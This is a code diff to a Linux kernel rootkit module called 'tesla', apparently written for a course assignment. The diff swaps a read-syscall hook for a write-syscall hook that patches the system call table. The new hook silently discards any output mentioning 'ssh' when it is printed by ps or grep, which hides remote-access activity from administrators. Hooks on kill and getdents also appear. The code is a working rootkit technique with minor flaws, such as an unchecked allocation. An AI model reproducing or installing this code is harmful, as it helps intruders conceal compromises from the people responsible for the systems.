@@ -12,26 +12,31 @@
 #include <linux/types.h>  /* size_t */
 #include "tesla.h"
 
-MODULE_AUTHOR("Jidong Xiao"); /* change this line to your name */
+MODULE_AUTHOR("Jason Kuphaldt"); /* change this line to your name */
 MODULE_LICENSE("GPL v2");
 
 /* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */
 
 asmlinkage long tesla_read(unsigned int fd, char __user *buf, size_t count)
 {
-	int read;
-	read = orig_read(fd, buf, count);
-	if(read){
-		if(strstr(buf, "tesla")){
-			printk("tesla detected");
-		}
-	}
-	return read;
+	return 0;
 }
 
 asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
 {
-	return 0;
+	char *kbuf;
+	kbuf = kmalloc(count, GFP_KERNEL);
+	copy_from_user(kbuf, buf, count);
+	if (strstr(kbuf, "ssh") && strstr(current->comm, "ps")) {
+		kfree(kbuf);
+		return count;
+	}
+	if (strstr(kbuf, "ssh") && strstr(current->comm, "grep")) {
+		kfree(kbuf);
+		return count;
+	}
+	kfree(kbuf);
+	return orig_write(fd, buf, count);
 }
 
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
@@ -90,9 +95,9 @@ int tesla_init(void)
 	orig_kill= (void *)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (long *)tesla_kill;
 
-	/* save the original read system call into orig_read, and replace the read system call with tesla_read */
-	orig_read = (void *)sys_call_table[__NR_read];
-	sys_call_table[__NR_read] = (long *)tesla_read;
+	/* save the original write system call into orig_write, and replace the write system call with tesla_write */
+	orig_write = (void *)sys_call_table[__NR_write];
+	sys_call_table[__NR_write] = (long *)tesla_write;
 
 	/* set bit 16 of cr0, so as to turn the write protection on */
 
@@ -113,7 +118,7 @@ void tesla_exit(void)
 	sys_call_table[__NR_kill] = (long *)orig_kill;
 
 	/* restore the read system call to its original version */
-	sys_call_table[__NR_read] = (long *)orig_read;
+	sys_call_table[__NR_write] = (long *)orig_write;
 
 	/* set bit 16 of cr0 */
 	write_cr0(read_cr0() | 0x10000);
